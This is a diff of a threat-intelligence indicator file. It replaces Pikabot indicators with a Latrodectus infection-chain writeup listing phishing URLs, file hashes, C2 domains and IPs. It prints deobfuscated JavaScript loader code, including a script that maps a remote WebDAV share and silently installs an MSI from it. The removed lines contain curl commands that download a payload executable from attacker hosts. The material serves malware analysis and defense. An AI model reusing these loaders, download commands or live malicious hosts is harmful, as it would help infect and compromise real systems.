@@ -1,85 +1,90 @@
-
-THREAT IDENTIFICATION: TA577 / PIKABOT
+THREAT IDENTIFICATION: LATRODECTUS
 
 SUBJECTS OBSERVED
-Email subjects appear to be from previously stolen email threads.
-
-SENDERS OBSERVED
-alemao09@terra.com.br
-amyroa.lnlnkmcei@cldcorpservices.com
-atlasaca@sic.edu.ph
-cbrakus@listsoplenty.com
-esn3nreiet7@technologybridge.mn
+Contact Submission
 
 INFECTION FLOW
-eml -> url -> zip -> js -> ps -> exe
+.eml -> url -> .js -> .js (embedded) -> .msi -> .dll (likely embedded)
 
-ZIP FILE DOWNLOAD REDIRECT URLS
-https://lalsonscalicut.com/1xnjk/?78222432
-https://growmaxbi.com/bz1lxh/?57322432
-https://erkmensigorta.com.tr/8uq/?36612432
-https://montaj-parchet-industrial.ro/dh4p/?15022432
+URL FROM THE EMAIL
+https://alan4president.com/b1750616502008583h13326991a44/casea22036311d7287/court/public/898372694484/dwnld/documents?n59985026=1631051366&c=ca&dmc=www.<redacted>.com&2918060e3&cmp=sidley&6961498r7
 
-ZIP FILE DOWNLOAD URLS
-https://lalsonscalicut.com/1xnjk//?yfQTV1TytMM=1707493608
-https://montaj-parchet-industrial.ro/dh4p//?r8i1mpV8wo=1707499683
-https://erkmensigorta.com.tr/8uq//?cQ5FvmkREJWn=1707499684
+FILTERED COMPUTERS REDIRECTED TO:
+https://harvardlawreview.org/wp-content/uploads/2016/06/2289-2296-Online.pdf?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacted>.com&n59985026=1631051366
 
-ZIP FILE HASHES
-038ffe197ca4e66ac760a79f1714bf27
-63bf5f5a2bf19a924320879af4beee0b
-98c38ada7e334d61a412740eacb3365d
-a224f8451d203bf77149a9d645c4a8ea
-(All files that I saw were named: [A-Z]{2,4}\.zip)
+LANDING PAGE URL
+https://gulfinsidermedia.com/?2918060e3&6961498r7&c=ca&cmp=sidley&dmc=www.<redacted>.com&n59985026=1631051366
 
-JAVASCRIPT FILE HASHES
-07a0ea573d027bf975ccd14021fc2eb4
-22db380382b16c530a09c2041d1dad9d
-518a575a8fc60cc9f5788cedb3d9d944
-79f6d7fc217dd8a462cca984a0556a83
-(All files that I saw were named: Notes[a-z]{1,2}\.js)
-(Except 1 file which was named: Qkl.js)
+JAVASCRIPT FILE DOWNLOAD URL
+https://firebasestorage.googleapis.com/v0/b/tst-4828.appspot.com/o/22OEf9N8Pv%2FLetter_k08_27h181190-57w49674g3400-9586e9.js?alt=media&token=225d98fc-c948-41e4-8803-f3988791b8f6
 
-LIKELY DECOY FILE HASHES
-1a69018bfdfc07017b03cf0d01b09ada
-9b508680acc8b21762a8ed392096367b
-cf5c05572b66e3fe971f39d85c72261b
-ed49000ea80c9cf7604bda133d7f3807
-(All files that I saw were named: [a-z]{1,2})
+JAVASCRIPT FILE HASH
+Letter_k08_27h181190-57w49674g3400-9586e9.js
+fdec2d3ab8e13d309a097622944a085e
 
-URL FROM JAVASCRIPT
-https://muellerinfo.com/vnO/
+DEOBFUSCATED JAVASCRIPT FILE
+var fso = new ActiveXObject('Scripting.FileSystemObject')
+var scriptPath = WScript.ScriptFullName
+try {
+if (fso.FileExists(scriptPath)) {
+var file = fso.OpenTextFile(scriptPath, 1)
+var scriptCode = ''
+while (!file.AtEndOfStream) {
+var line = file.ReadLine()
+if (line.indexOf('////') === 0) {
+scriptCode += line.substring(4) + '\n'
+}
+}
+file.Close()
+if (scriptCode) {
+var func = new Function(scriptCode)
+func()
+}
+}
+} catch (e) {}
 
-INTERCEPTED CURL COMMANDS (malformed)
-curl  0.7091575260931959.dat --output C:\Skfgjyfjyfjdfhdj\Vyhtjjfdhfjghkg\Rjhfjyfjdhdfhdjf.exe
-curl  0.598002429814514.dat --output C:\Skfgjyfjyfjdfhdj\Vyhtjjfdhfjghkg\Rjhfjyfjdhdfhdjf.exe
-curl  0.24613499109950337.dat --output C:\Skfgjyfjyfjdfhdj\Vyhtjjfdhfjghkg\Rjhfjyfjdhdfhdjf.exe
-curl  0.08997087419308652.dat --output C:\Skfgjyfjyfjdfhdj\Vyhtjjfdhfjghkg\Rjhfjyfjdhdfhdjf.exe
+DEOBFUSCATED SECOND EMBEDDED SCRIPT
+var network = new ActiveXObject("WScript.Network");
+for (var driveLetter = 90; driveLetter >= 65; driveLetter--) {
+    var letter = String.fromCharCode(driveLetter) + ":";
+    try {
+       network.MapNetworkDrive(letter, "\\\\45.140.146.156@80\\share\\");
+        var startTime = new Date();
+        while (new Date() - startTime < 6000) {}
+        GetObject("winmgmts:\\\\.\\root\\cimv2").Get("Win32_Process").Create('msiexec.exe -i \\\\45.140.146.156@80\\share\\observ.msi -qn', null, null, null);
+        network.RemoveNetworkDrive(letter);
+        break;
+    } catch (e) {
+    }
+}
 
-CORRECT CURL COMMAND
-curl  https://muellerinfo.com/vnO/0.892566133587475.dat --output C:\Skfgjyfjyfjdfhdj\Vyhtjjfdhfjghkg\Rjhfjyfjdhdfhdjf.exe
+TRAFFIC OBSERVED TO
+http://45.140.146.156/share
+http://45.140.146.156/share/Desktop.ini
+http://45.140.146.156/share/AutoRun.inf
+http://45.140.146.156/share/observ.msi
 
-PAYLOAD DOWNLOAD URL
-https://allstocksinc.com/YDr/0.16553226537255283.dat
-https://muellerinfo.com/vnO/0.892566133587475.dat
-https://toptrinityblog.com/VUIhcGp/0.9941106282398995.dat
+MSI FILE HASH
+observ.msi
+876c5d995847eb3acfbe3a546648a7fb
 
-PAYLOAD FILE HASH
-Rjhfjyfjdhdfhdjf.exe
-f02f5d29fa91a9a926c9e374f0ad6185
+SCRIPT ERROR (LIKELY A DECOY)
+There was a problem starting 
+C:\Users\analyst\AppData\Local\Putty/setordinal.dll
 
-UNPACKED PAYLOAD FILE HASH
-2fd0000.ctfmon.exe
-3c5f4ef6b7b1fbbaa13b4d9bb0306176
+URL REFERENCED IN FILE
+https://github.com/mar10/wsgidav/
+"A generic and extendable WebDAV server written in Python and based on WSGI"
 
-PIKABOT C2s
-37.60.242.86:2967
-23.226.138.143:2083
-37.60.242.85:9785
-23.226.138.161:5242
-158.220.80.167:2967
-178.18.246.136:2078
-85.239.243.155:5000
+DLL FILE HASH
+setordinal.dll
+50a91559fab7869d51c0a7727c47a783
 
-STREAM
-GG20_FR@T@f0adda360d2b4ccda11468e026526576
+DLL LAUNCH COMMAND
+rundll32 setordinal.dll,bhuf
+
+C2 TRAFFIC
+https://plwskoret.top/live/
+https://miistoria.com/live/
+
+
